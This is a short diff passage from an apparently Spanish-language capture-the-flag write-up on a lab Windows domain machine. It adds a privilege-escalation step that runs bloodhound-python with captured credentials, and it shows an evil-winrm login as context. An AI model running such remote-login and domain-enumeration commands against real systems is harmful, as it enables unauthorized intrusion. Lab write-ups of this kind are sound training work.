@@ -239,3 +239,11 @@ evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
 
 # Escalada de privilegios
+### BloodHound
+
+Usaremos la herramienta de [[BLOODHOUND]] para extraer toda la información posible de la maquina y poder analizarlo gráficamente los pasos que deberemos de realizar para la escalada de privilegios
+```shell
+bloodhound-python -d support.htb -ns 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful' -c ALL --zip
+```
+
+
